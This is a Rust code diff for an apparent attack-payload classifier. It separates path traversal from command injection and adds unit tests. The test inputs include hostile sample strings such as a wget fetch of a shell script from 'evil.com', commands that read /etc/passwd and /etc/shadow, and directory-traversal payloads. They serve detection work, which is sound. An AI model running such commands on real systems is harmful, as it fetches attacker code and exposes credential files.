@@ -195,7 +195,27 @@ pub fn classify(payload: &str) -> PayloadType {
     } else if xss_signals >= sql_signals && xss_signals >= cmd_signals && xss_signals >= 1 {
         PayloadType::Xss
     } else if cmd_signals >= 1 {
-        PayloadType::CommandInjection
+        // Before accepting CMDi, check if this is actually path traversal.
+        // A bare "../../../etc/passwd" has no shell separator — it's LFI, not CMDi.
+        // CMDi requires at least one separator-triggered signal (;, |, &&, ||, `, $()
+        // or ${IFS}). If the only match is /etc/passwd or /bin/ without a separator,
+        // it's path traversal.
+        let has_separator_signal =
+            (lower.contains("; ") && contains_shell_command(&lower))
+            || (lower.contains("| ") && contains_shell_command(&lower))
+            || (lower.contains("&& ") && contains_shell_command(&lower))
+            || (lower.contains("|| ") && contains_shell_command(&lower))
+            || (lower.contains('`') && contains_shell_command(&lower))
+            || (lower.contains("$(") && contains_shell_command(&lower))
+            || lower.contains("${ifs}")
+            || (contains_shell_command(&lower) && lower.starts_with([';', '|']));
+        if has_separator_signal {
+            PayloadType::CommandInjection
+        } else if path_traversal::detect_type(payload) {
+            PayloadType::PathTraversal
+        } else {
+            PayloadType::CommandInjection
+        }
     } else {
         // No core type match — check extended types
         if ldap::detect_type(payload) {
@@ -520,6 +540,28 @@ mod tests {
         assert_eq!(classify("| ls -la"), PayloadType::CommandInjection);
         assert_eq!(
             classify("&& wget http://evil.com/shell.sh"),
+            PayloadType::CommandInjection
+        );
+    }
+
+    #[test]
+    fn classify_path_traversal_not_cmdi() {
+        // Bare path traversal with /etc/passwd should NOT be classified as CMDi
+        assert_eq!(
+            classify("../../../etc/passwd"),
+            PayloadType::PathTraversal
+        );
+        assert_eq!(
+            classify("....//....//....//etc/passwd"),
+            PayloadType::PathTraversal
+        );
+        // But command + separator IS still CMDi
+        assert_eq!(
+            classify("; cat /etc/passwd"),
+            PayloadType::CommandInjection
+        );
+        assert_eq!(
+            classify("| cat /etc/shadow"),
             PayloadType::CommandInjection
         );
     }
